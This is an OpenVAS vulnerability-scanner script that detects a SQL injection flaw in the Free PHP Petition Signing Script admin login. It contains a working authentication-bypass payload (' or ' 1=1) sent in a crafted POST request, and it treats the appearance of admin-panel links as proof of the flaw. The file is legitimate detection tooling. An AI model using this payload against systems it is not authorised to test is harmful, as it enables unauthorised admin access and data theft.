###############################################################################
# OpenVAS Vulnerability Test
# $Id: php_petition_34273.nasl 5016 2017-01-17 09:06:21Z teissa $
#
# Free PHP Petition Signing Script Login Page SQL Injection
# Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.100088");
 script_version("$Revision: 5016 $");
 script_tag(name:"last_modification", value:"$Date: 2017-01-17 10:06:21 +0100 (Tue, 17 Jan 2017) $");
 script_tag(name:"creation_date", value:"2009-03-29 17:14:47 +0200 (Sun, 29 Mar 2009)");
 script_bugtraq_id(34273);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

 script_name("Free PHP Petition Signing Script Login Page SQL Injection Vulnerability");

 script_category(ACT_GATHER_INFO);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : "Free PHP Petition Signing Script is prone to an SQL-injection
 vulnerability because it fails to sufficiently sanitize
 user-supplied data before using it in an SQL query.");
 script_tag(name : "impact" , value : "Exploiting this issue could allow an attacker to compromise the
 application, access or modify data, or exploit latent
 vulnerabilities in the underlying database.");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/34273");

 script_tag(name:"qod_type", value:"remote_app");

 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!can_host_php(port:port))exit(0);

host = http_host_name( port:port );

dirs = make_list("/petition",cgi_dirs());
foreach dir (dirs) {

    url = string(dir, "/signing_system-admin/index.php");
    req = http_get(item:url, port:port);
    buf = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if( buf == NULL )continue;

    if( egrep(pattern: "Signing System", string: buf) || egrep(pattern: "Script by Rediscussed\.com", string: buf) ) {
	    variables = string("username=%27%20or%20%27%201=1&password=");
	    filename = string(dir + "/signing_system-admin/index.php");

	    req = string(
	      "POST ", filename, " HTTP/1.0\r\n", 
	      "Referer: ","http://", host, filename, "\r\n",
	      "Host: ", host, "\r\n", 
	      "Content-Type: application/x-www-form-urlencoded\r\n", 
	      "Content-Length: ", strlen(variables), 
	      "\r\n\r\n", 
	      variables
	    );

	    result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
	    if( result == NULL )continue;

	    if(
	       egrep(pattern: "<a href='logout.php[^>]*>Log Out</a>", string: result) &&
	       egrep(pattern: "<a href='add-topic.php[^>]*>Add Topic</a>", string: result) )
	     {
	         security_message(port:port);
	         exit(0);
	     }
    }
}

exit(99);
